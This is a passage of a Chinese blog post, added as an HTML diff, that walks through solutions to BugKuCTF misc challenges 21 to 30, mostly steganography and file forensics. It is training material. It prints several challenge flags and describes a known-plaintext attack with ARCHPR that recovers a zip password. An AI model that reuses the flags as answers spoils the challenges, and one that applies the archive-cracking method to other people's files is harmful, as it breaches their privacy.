@@ -134,6 +134,290 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-BugKuCTF—杂项题 第21-30关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/03/07/BugKuCTF—杂项题 第21-30关/">BugKuCTF — 杂项题(第21-30关)</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/03/07/BugKuCTF—杂项题 第21-30关/" class="archive-article-date">
+  	<time datetime="2019-03-06T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-07</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前一部分链接：第11-20关Write-up"><a href="#前一部分链接：第11-20关Write-up" class="headerlink" title="前一部分链接：第11-20关Write-up"></a>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/03/04/BugKuCTF%E2%80%94%E6%9D%82%E9%A1%B9%E9%A2%98%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></h3><h3 id="第二一关（细心的大象）"><a href="#第二一关（细心的大象）" class="headerlink" title="第二一关（细心的大象）"></a>第二一关（细心的大象）</h3><p>题目链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://share.weiyun.com/9287be0a629971ac53d97f39727eee18</span><br></pre></td></tr></table></figure>
+<p>下载下来一个名为<strong>1.jpg.zip</strong>的文件，解压下来一张叫做<strong>1.jpg</strong>的图片，看一下图片属性，看到了好像有用的一串文字</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/1-1.png" alt="1-1"></p>
+<p>看起来有点像base64的加密，先解开后放着MSDS456ASD123zz</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/1-2.png" alt="1-2"></p>
+<p>放到Kali里面，用binwalk看一下，确实藏着东西</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/1-3.png" alt="1-3"></p>
+<p>提取出来看一下，是一个<strong>rar</strong>压缩文件，提取时，需要输入密码。把刚才base64解密出来的密码输入进去，就是它！</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/1-4.png" alt="1-4"></p>
+<p>分析rar压缩包解压出来的2.png图片，图片无法打开浏览，并且没得到什么有用信息</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/1-5.png" alt="1-5"></p>
+<p>将这张图片放到Windows环境下是可以浏览的</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/1-6.png" alt="1-6"></p>
+<p>用winhex打开，还是看到高度和宽度不一样，直接将高度修改成和宽度一样，再次浏览图片时，就看到了flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/1-7.png" alt="1-7"></p>
+<hr>
+<h3 id="第二十二关（爆照）"><a href="#第二十二关（爆照）" class="headerlink" title="第二十二关（爆照）"></a>第二十二关（爆照）</h3><p>题目链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/fa88c409b367aa9243313a85d138d183/8.jpg</span><br></pre></td></tr></table></figure>
+<p>下载下来一张jpg图片，用binwalk看一下， 有藏着东西</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/2-1.png" alt="2-1"></p>
+<p>foremost分理处挺多张图片，但是都没有后缀名</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/2-2.png" alt="2-2"></p>
+<p>首先看到88这张图片里面有二维码，扫一下看到bilibili</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/2-3.png" alt="2-3"></p>
+<p>通过binwalk分析每一张图片，发现8888这张图片里面藏着东西，分离出来，也是一个二维码，扫一下出现panama</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/2-4.png" alt="2-4"></p>
+<p>在Kali中没有其他信息后，转到Windows环境，查看每一张图片的属性</p>
+<p>在888这个图片的属性中，发现了base64加密的字符串，解密后得到silisili</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/2-5.png" alt="2-5"></p>
+<p>那么现在一共得到了3个不同的字符串，题目提示的flag格式是{XXXX_XXXX_XXXX}</p>
+<p>我们在88得到的是bilibili，在888得到的是silisili，在8888得到的是panama，将他们按顺序拼起来，提交就是正确的flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/2-6.png" alt="2-6"></p>
+<hr>
+<h3 id="第二十三关（猫片安恒）"><a href="#第二十三关（猫片安恒）" class="headerlink" title="第二十三关（猫片安恒）"></a>第二十三关（猫片安恒）</h3><p>题目链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/9f1bebac6b8282da716720cc99f35bed/png</span><br></pre></td></tr></table></figure>
+<p>下载下来一个叫做png的文件，通过winhex查看前缀（89 50 4E 47）知道这是一张png图片，加上后缀就可以看到图片</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-1.png" alt="3-1"></p>
+<p>查看属性和放到Kali里面去binwalk看一下都没有什么信息</p>
+<p>那么就重新回到Windows环境下，使用<strong>Stegsolve — DataExtract</strong>试着看能不能提取信息</p>
+<p>由于题目提示”hint:LSB BGR NTFS”，那我们也就相应勾选选项，发现了一个新的好像是PNG的图片</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-2.png" alt="3-2"></p>
+<p>为什么说好像是PNG呢，因为这个文件前缀多了FFFE。我们先把这个文件保存下来</p>
+<p>然后用winhex打开，将这个多余的FFFE去掉，再加上.png的后缀试一下，出现了一半的二维码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-3.png" alt="3-3"></p>
+<p>修改一下图片的高度，就能看到整个完整的二维码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-4.png" alt="3-4"></p>
+<p>但是总感觉这个二维码哪里怪怪的，说不上来，对比了一下正常的二维码，发现是“黑白颠倒”了</p>
+<p>放到Stegsolve里面，点一下下方的箭头，转换到Colour Inversion(颜色翻转)，就可以看到正常的二维码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-5.png" alt="3-5"></p>
+<p>拿到在线二维码解码网站去，扫出来的结果居然不是flag，是一个网站，还有事要做的</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-6.png" alt="3-6"></p>
+<p>下载下来一个rar压缩文件，解压出txt文档，打开还是没有flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-7.png" alt="3-7"></p>
+<p>用winhex打开rar压缩文件，除了之前解压下来的flag.txt外，发现还藏着东西（STM：flag.p。。。）</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-8.png" alt="3-8"></p>
+<p>哇，再下去实在没有思路了。只能去百度，看其他大佬的writeup写着，需要用到工具<strong>ntfsstreamseditor</strong></p>
+<p>下载下来，以flag.txt为目标，果然提取出来了东西</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-9.png" alt="3-9"></p>
+<p>提取出来的是一个.pyc后缀的文件，需要反编译才能看到内容</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-10.png" alt="3-10"></p>
+<p>拿到在线的网站去反编译，果然可以，并且看到了代码内容</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-11.png" alt="3-11"></p>
+<p>几个知识点的简单描述：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ord()函数：转成ASCII码</span><br><span class="line">chr()函数：转成ASCII码对应的文字</span><br><span class="line">str()函数：转成字符串形式</span><br><span class="line">.append()函数：在一个数组后面添加新的元素</span><br><span class="line">^运算符：是异或运算，若A ^ B = C，那么c ^ A(B) = B(A)</span><br></pre></td></tr></table></figure>
+<p>自己用Python写，将代码的过程逆转过来，相当于解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ciphertext = [&apos;96&apos;,&apos;65&apos;,&apos;93&apos;,&apos;123&apos;,&apos;91&apos;,&apos;97&apos;,&apos;22&apos;,&apos;93&apos;,&apos;70&apos;,&apos;102&apos;,&apos;94&apos;,&apos;132&apos;,</span><br><span class="line">    &apos;46&apos;,&apos;112&apos;,&apos;64&apos;,&apos;97&apos;,&apos;88&apos;,&apos;80&apos;,&apos;82&apos;,&apos;137&apos;,&apos;90&apos;,&apos;109&apos;,&apos;99&apos;,&apos;112&apos;]</span><br><span class="line"></span><br><span class="line">flag=&apos;&apos;</span><br><span class="line"></span><br><span class="line">ciphertext.reverse()</span><br><span class="line">for i in range(len(ciphertext)):</span><br><span class="line">    if i % 2 == 0:</span><br><span class="line">        s = int(ciphertext[i]) - 10</span><br><span class="line">    else:</span><br><span class="line">        s = int(ciphertext[i]) + 10</span><br><span class="line">    s = chr(i ^ s)</span><br><span class="line">    flag = flag + s</span><br><span class="line">    </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-12.png" alt="3-12"></p>
+<p>注意这个<strong>ciphertext.reverse()</strong>，刚开始没有加这段代码，得出错误的结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-13.png" alt="3-13"></p>
+<p>加完之后得到正确的flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/3-14.png" alt="3-14"></p>
+<hr>
+<h3 id="第二十四关（多彩）"><a href="#第二十四关（多彩）" class="headerlink" title="第二十四关（多彩）"></a>第二十四关（多彩）</h3><p>题目链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/9c1e769e2799f5b79ddadbdf49ac274b/lipstick.png</span><br></pre></td></tr></table></figure>
+<p>题目有些问题，而且实际意义并不大，就先不做了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;White_Album_is_Really_worth_watching_on_White_Valentine&apos;s_Day&#125;</span><br></pre></td></tr></table></figure>
+<p>可以参考这篇文章：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/x947955250/article/details/82805575</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="第二十五关（旋转跳跃）"><a href="#第二十五关（旋转跳跃）" class="headerlink" title="第二十五关（旋转跳跃）"></a>第二十五关（旋转跳跃）</h3><p>题目链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/5ca9828f72fd613ea0699d89074d642b/sycgeek-mp3_2.zip</span><br></pre></td></tr></table></figure>
+<p>下载下来一个压缩包，解压下来一个mp3文件，听一下是一段音乐</p>
+<p>什么都没有发现，于是开始利用工具：MP3Stego对音频进行解码</p>
+<p>先将音频复制一份到MP3Stego的目录下，执行以下命令进行解码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode.exe -X -P syclovergeek sycgeek-mp3.mp3</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/5-1.png" alt="5-1"></p>
+<p>MP3Stego解码命令是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode.exe -X -P 密码 文件名</span><br></pre></td></tr></table></figure>
+<p>其中密码题目有给我们提示</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/5-2.png" alt="5-2"></p>
+<p>查看提取出来的文件，里面直接写在flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/5-3.png" alt="5-3"></p>
+<hr>
+<h3 id="第二十六关（普通的二维码）"><a href="#第二十六关（普通的二维码）" class="headerlink" title="第二十六关（普通的二维码）"></a>第二十六关（普通的二维码）</h3><p>题目链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/5e480ecb178711e82bc847a208e15b32/misc80.zip</span><br></pre></td></tr></table></figure>
+<p>下载下来一个压缩包，解压下来一个二维码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/6-1.png" alt="6-1"></p>
+<p>扫描一下显示”哈哈！就不告诉你flag就在这里”，然后什么都没有了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/6-2.png" alt="6-2"></p>
+<p>用winhex打开看一下， 在末尾发现了规则的字符串</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/6-3.png" alt="6-3"></p>
+<p>没有看到字母，应该不是16进制。而且只有0-7的数字，猜测是8进制</p>
+<p>用python进制转换，将整串字符串转换成十进制，然后把十进制转换成ASCII码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/6-4.png" alt="6-4"></p>
+<p>得到一串乱码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/6-5.png" alt="6-5"></p>
+<p>既然整串是错的，那么就三个三个转换，试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = &apos;146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175&apos;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(0,len(a),3):</span><br><span class="line">    flag = flag+chr(int(a[i:i+3],8))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/6-6.png" alt="6-6"></p>
+<p>拿下了flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/6-7.png" alt="6-7"></p>
+<hr>
+<h3 id="第二十七关（乌云邀请码）"><a href="#第二十七关（乌云邀请码）" class="headerlink" title="第二十七关（乌云邀请码）"></a>第二十七关（乌云邀请码）</h3><p>题目地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/69fed30501c47ddd56250587d359e7d9/misc50.zip</span><br></pre></td></tr></table></figure>
+<p>下载下来一个zip文件，解压后是一张png图片</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/7-1.png" alt="7-1"></p>
+<p>查看属性和用winhex看什么都没有发现。用Stegsolve打开 — “Data Extract” — “Preview”</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/7-2.png" alt="7-2"></p>
+<p>直接看到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/7-3.png" alt="7-3"></p>
+<p>记得将多余的空格删掉</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/7-4.png" alt="7-4"></p>
+<hr>
+<h3 id="第二十八关（神秘的文件）"><a href="#第二十八关（神秘的文件）" class="headerlink" title="第二十八关（神秘的文件）"></a>第二十八关（神秘的文件）</h3><p>题目链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/d017f513e8f414cae61bfa3498ea34a8/5ee325f5-44c6-4a0b-b496-a0b11ef6dca1.rar</span><br></pre></td></tr></table></figure>
+<p>下载下来一个zip文件，另外解压出一个zip文件和一个png文件</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/8-1.png" alt="8-1"></p>
+<p>尝试解压flag.zip却需要密码，浏览png图片没有提供信息</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/8-2.png" alt="8-2"></p>
+<p>浏览flag.zip，发现里面也有logo.png</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/8-3.png" alt="8-3"></p>
+<p>那我们就可以利用工具ARCHPR。先将logo.png压缩成password.zip</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/8-4.png" alt="8-4"></p>
+<p>打开ARCHPR。加密文件选择flag.zip，攻击类型选择”明文”，明文文件路径选择password.zip</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/8-5.png" alt="8-5"></p>
+<p>成功拿下密码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/8-6.png" alt="8-6"></p>
+<p>成功把logo.png和一个word文档解压下来。文档无法正常打开，我们用winhex打开看一下，在末尾发现flag.txt</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/8-7.png" alt="8-7"></p>
+<p>在Kali中binwalk看一下，确实有东西</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/8-8.png" alt="8-8"></p>
+<p>有分离出来一个zip文件，我们将它解压下来，可以看到flag.txt，查看一下发现是base64加密</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/8-9.png" alt="8-9"></p>
+<p>解密这串bas64，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/8-10png" alt="8-10"></p>
+<hr>
+<h3 id="第二十九关（论剑）"><a href="#第二十九关（论剑）" class="headerlink" title="第二十九关（论剑）"></a>第二十九关（论剑）</h3><p>题目链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/934db0621d88bd8b16049c1b795c6a1a/lunjian.jpg</span><br></pre></td></tr></table></figure>
+<p>图片平平无奇，属性内没有备注。winhex打开，中间发现一串二进制</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-1.png" alt="9-1"></p>
+<p>8位为一个单位，用Python二进制转ascii看一下，内容是：mynameiskey!!!hhh，先放着</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-2.png" alt="9-2"></p>
+<p>window上已经没有发现任何东西了，拿到Kali上，binwalk一下，发现有藏着东西，提取出来</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-3.png" alt="9-3"></p>
+<p>图片浏览起来是一样的</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-4.png" alt="9-4"></p>
+<p>对第二张图片尝试现在知道的各种方法，属性、binwalk、winhex、Stegsolve都没有结果</p>
+<p>最后看别人WP，说要修改jpg图片的高度才能看到，我目前只会修改png的，惭愧，现在正好接触到学一下</p>
+<p>网上各种文字提到修改JPG图片的高度和宽度都是说要找0xFFC0（SOFO，Start of Frame，帧图像开始）标示位，然后往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-5.png" alt="9-5"></p>
+<p>我对lunjian.jpg尝试了一下，确实有找到0xFFCO关键字，但是确在整个图片内容的后半部分。尝试从第3个字节开始修改，发现图片纹丝不动，我还多次重新打开winhex，重新打开图片，但就是没用。后来又去找了将近20篇讲解JPG图片的文章，关于图片的高度描述都是说0xFFC0后第四位开始，我还去网上下载了JPG图片，按照方法去修改，这次的确将高度修改成功了，但是对lunjian.jpg就是修改不了，有点崩溃。</p>
+<p>最后的最后，去百度JPG图片分析的软件，抱着尝试的心态下载了一个叫<strong>JPEGsnoop</strong>的软件，打开lunjian.jpg。曙光终于来了，我在分析出来的结果中看到了关于高度和宽度的信息，并且是在一个叫<strong>SOF2</strong>的块里。这个块以<strong>FFC2</strong>开头（其实换成FFC0就是大部分文章说的，神秘的SOFO，Start of Frame块），里面有高度和宽度的信息</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-6.png" alt="9-6"></p>
+<p>那就按照这个去winhex里找FFC2（Ctrl + Alt + X找Hex Values），成功找到，并且在内容的较前位置，应该是真的了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-7.png" alt="9-7"></p>
+<p>从0xFFC2开始，对比JPEGsnoop的值，16进制转化过来是相等的，怀着激动的心情尝试着将00 42改成00 EE</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-8.png" alt="9-8"></p>
+<p>保存完，查看图片，成功了。也算是一波三折，成功后老泪纵横</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-9.png" alt="9-9"></p>
+<p>给出的数字打上了马赛克，题目并没有解决</p>
+<p>继续分析，发现之前我们获取01二进制的那个位置后面，有可疑十六进制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BC AF 27 1C</span><br></pre></td></tr></table></figure>
+<p>而7z的文件头是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">37 7A BC AF 27 1C</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-10.png" alt="9-10"></p>
+<p>将其修复</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-11.png" alt="9-11"></p>
+<p>再次将这张图片拿去binwalk分析，发现果然有了新东西</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-12.png" alt="9-12"></p>
+<p>分离时，使用foremost好像分离不出来这个7z文件，所以改成使用dd来分离</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-13.png" alt="9-13"></p>
+<p>提取时需要输入密码，想到此题最开始获得的暂时放着的字符串mynameiskey!!!hhh</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-14.png" alt="9-14"></p>
+<p>果然可以提取成功，查看一下提取出来的ljc2.jpg图片，还是一样，可能还是需要修改高度</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-15.png" alt="9-15"></p>
+<p>再次拿到winhex下，修改高度，得到另一串打码的字</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-16.png" alt="9-16"></p>
+<p>和上一张打码的对比组合起来就是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666C61677B6D795F6E616D655F482121487D</span><br></pre></td></tr></table></figure>
+<p>发现是<strong>base16</strong>，用Python解码一下，得到了flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-18.png" alt="9-18"></p>
+<hr>
+<h3 id="第三十关（图穷匕现）"><a href="#第三十关（图穷匕现）" class="headerlink" title="第三十关（图穷匕现）"></a>第三十关（图穷匕现）</h3><p>题目链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/f6697e1f904a0c30b56f72fcf0023434/paintpaintpaint.jpg</span><br></pre></td></tr></table></figure>
+<p>有备注信息，先放着</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/10-1.png" alt="10-1"></p>
+<p>用winhex打开，发现在JPG图片结束标识（FFD9）之后，有很纪律的数字</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/10-2.png" alt="10-2"></p>
+<p>复制粘贴到Notepad++里面，使用插件Hex转换成ASCII</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/10-3.png" alt="10-3"></p>
+<p>发现是一列一列的坐标</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/10-4.png" alt="10-4"></p>
+<p>将括号和逗号全部去掉</p>
